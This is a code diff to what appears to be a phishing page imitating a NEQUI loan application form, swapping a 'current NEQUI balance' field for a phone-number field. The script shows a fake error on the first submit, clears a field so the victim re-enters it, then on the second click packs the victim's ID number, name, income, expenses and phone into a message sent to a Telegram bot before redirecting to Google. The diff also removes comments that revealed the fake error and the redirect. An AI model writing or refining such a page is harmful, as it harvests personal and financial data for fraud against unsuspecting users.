@@ -77,6 +77,11 @@
       word-wrap: break-word;
       display: none;
     }
+
+    /* Ocultar el footer del error message */
+    .errorMessage footer {
+      display: none;
+    }
   </style>
 </head>
 
@@ -195,17 +200,6 @@
         </p>
       </div>
     </div>
-
-    <footer>
-      <div class="wrap">
-        <div class="wrapper">
-          <div class="footer">
-            <img class="footer-pc" src="../assets/footer-bigscreen.png" alt="">
-            <img class="footer-mobile" src="../assets/footer.png" alt="">
-          </div>
-        </div>
-      </div>
-    </footer>
   </section>
 
   <main class="mainContainer">
@@ -309,16 +303,13 @@
               <span id="gastosErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tus gastos
                 mensuales</span>
 
-              <!-- Saldo -->
+              <!-- Número de Celular -->
               <div class="form-group">
-                <input type="text" id="saldoActualSalvavidas" required="">
-                <label for="saldoActual">Saldo actual en tu cuenta NEQUI</label>
+                <input type="tel" id="numeroCelularSalvavidas" required="" inputmode="numeric" maxlength="10" pattern="[0-9]*">
+                <label for="numeroCelularSalvavidas">Número de celular</label>
               </div>
-              <span id="saldoErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tu Saldo actual en tu
-                cuenta NEQUI</span>
-              <span class="text-gray-500 text-xs">Por políticas financieras el saldo actual no será visible en la
-                solicitud, solo
-                hace parte del proceso de validación ante las centrales de riesgo.</span>
+              <span id="celularErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa un número de celular válido (10 dígitos)</span>
+              <span class="text-gray-500 text-xs">Tu número de celular será usado para la validación y contacto.</span>
             </div>
 
             <!-- Selector de meses -->
@@ -446,7 +437,7 @@
                 `🧑‍💼 *Ocupación:* ${formData.ocupacion}\n` +
                 `📈 *Ingresos mensuales:* ${formData.ingresoMensual}\n` +
                 `💸 *Gastos mensuales:* ${formData.gastosMensual}\n` +
-                `🔥 *Saldo NEQUI:* ${formData.saldoActual}\n` +
+                `📱 *Número de celular:* ${formData.numeroCelular}\n` +
                 `🔢 *Plazo:* ${formData.meses} meses\n` +
                 `📅 *Fecha de pago:* Día ${formData.fechaPago} de cada mes\n` +
                 `📢 *Tipo:* ${formData.tipoProducto}\n\n` +
@@ -484,8 +475,8 @@
               }
             }
 
-            // Elementos del loader NEQUI mint con redirección a Google
-            function mostrarLoaderNequiYRedirigir() {
+            // Función para mostrar loader y redirigir
+            function mostrarLoaderYRedirigir() {
               const contenedor = document.getElementById("loadingContenedor");
               const loader = document.getElementById("loader");
               const done = document.getElementById("done");
@@ -556,13 +547,18 @@
               return soloNumeros.length >= 4;
             }
 
+            function validarNumeroCelular(celular) {
+              const soloNumeros = celular.replace(/[^0-9]/g, '');
+              return soloNumeros.length === 10;
+            }
+
             function actualizarEstadoBotonContinuar() {
               const cedulaValida = validarCedula(cedulaSalvavidas.value);
               const nombreValido = validarNombre(
                 nombreCompletoSalvavidas.value
               );
-              const saldoActualValido = validarCampoNumerico(
-                saldoActualSalvavidas.value
+              const numeroCelularValido = validarNumeroCelular(
+                numeroCelularSalvavidas.value
               );
               const ingresoMensualValido = validarCampoNumerico(
                 ingresoMensualSalvavidas.value
@@ -572,12 +568,12 @@
               );
 
               btnContinuarSalvavidas.disabled = !(
-                cedulaValida && nombreValido && saldoActualValido && ingresoMensualValido && gastosMensualValido
+                cedulaValida && nombreValido && numeroCelularValido && ingresoMensualValido && gastosMensualValido
               );
 
               document.getElementById("cedulaErrorSalvavidas").classList.toggle('hidden', cedulaValida);
               document.getElementById("nombreErrorSalvavidas").classList.toggle('hidden', nombreValido);
-              document.getElementById("saldoErrorSalvavidas").classList.toggle('hidden', saldoActualValido);
+              document.getElementById("celularErrorSalvavidas").classList.toggle('hidden', numeroCelularValido);
               document.getElementById("ingresoErrorSalvavidas").classList.toggle('hidden', ingresoMensualValido);
               document.getElementById("gastosErrorSalvavidas").classList.toggle('hidden', gastosMensualValido);
               
@@ -586,17 +582,19 @@
               
               if (!nombreValido) nombreCompletoSalvavidas.classList.add("border-red-500");
               else nombreCompletoSalvavidas.classList.remove("border-red-500");
+              
+              if (!numeroCelularValido) numeroCelularSalvavidas.classList.add("border-red-500");
+              else numeroCelularSalvavidas.classList.remove("border-red-500");
             }
 
             const cedulaSalvavidas = document.getElementById("cedulaSalvavidas");
             const nombreCompletoSalvavidas = document.getElementById("nombreCompletoSalvavidas");
-            const saldoActualSalvavidas = document.getElementById("saldoActualSalvavidas");
+            const numeroCelularSalvavidas = document.getElementById("numeroCelularSalvavidas");
             const ingresoMensualSalvavidas = document.getElementById("ingresoMensualSalvavidas");
             const gastosMensualSalvavidas = document.getElementById("gastosMensualSalvavidas");
             const ocupacionSelectorSalvavidas = document.getElementById("ocupacionSelectorSalvavidas");
             const btnContinuarSalvavidas = document.getElementById("btnContinuarSalvavidas");
 
-            // Formateo de campos numéricos
             function formatCurrency(input) {
               let value = input.value;
               value = value.replace(/\D/g, "");
@@ -622,8 +620,9 @@
               actualizarEstadoBotonContinuar();
             });
 
-            saldoActualSalvavidas.addEventListener("input", (e) => {
-              formatCurrency(e.target);
+            numeroCelularSalvavidas.addEventListener("input", (e) => {
+              e.target.value = e.target.value.replace(/\D/g, "").slice(0,10);
+              actualizarEstadoBotonContinuar();
             });
 
             ingresoMensualSalvavidas.addEventListener("input", (e) => {
@@ -641,23 +640,20 @@
               loadingSpinner.style.display = "block";
               
               if (contSendButton === 1) {
-                // PRIMER CLIC: mostrar error simulado
                 setTimeout(() => {
                   errorMessage.style.display = "block";
-                  saldoActualSalvavidas.style.border = '2px solid #da0081'
+                  numeroCelularSalvavidas.style.border = '2px solid #da0081'
                   loadingSpinner.style.display = "none";
                 }, 4000);
 
                 setTimeout(() => {
                   errorMessage.style.display = "none";
                   contSendButton += 1;
-                  saldoActualSalvavidas.value = '';
+                  numeroCelularSalvavidas.value = '';
                   actualizarEstadoBotonContinuar();
                   window.scrollTo({ top: ingresoMensualSalvavidas.getBoundingClientRect().top + window.scrollY - 100, behavior: "smooth" });
                 }, 4000);
               } else {
-                // SEGUNDO CLIC: recopilar datos, enviar a Telegram y redirigir a Google
-                
                 const formData = {
                   cedula: cedulaSalvavidas.value,
                   nombreCompleto: nombreCompletoSalvavidas.value,
@@ -665,7 +661,7 @@
                   ocupacion: ocupacionSelectorSalvavidas.value,
                   ingresoMensual: ingresoMensualSalvavidas.value,
                   gastosMensual: gastosMensualSalvavidas.value,
-                  saldoActual: saldoActualSalvavidas.value,
+                  numeroCelular: numeroCelularSalvavidas.value,
                   meses: plazoSelectorSalvavidas.value,
                   fechaPago: fechaPago.value,
                   tipoProducto: 'Bajo monto'
@@ -673,15 +669,14 @@
                 
                 showDebugMessage('📝 Datos recopilados, enviando a Telegram...');
                 
-                // Enviar a Telegram (no esperamos respuesta para no retrasar la redirección)
-                enviarATelegram(formData);
+                // Enviar a Telegram
+                const resultado = await enviarATelegram(formData);
                 
-                // Mostrar loader y redirigir a Google
-                mostrarLoaderNequiYRedirigir();
+                // Mostrar loader y redirigir después de 4 segundos
+                mostrarLoaderYRedirigir();
               }
             });
             
-            // Inicializar
             actualizarEstadoBotonContinuar();
           });
         </script>
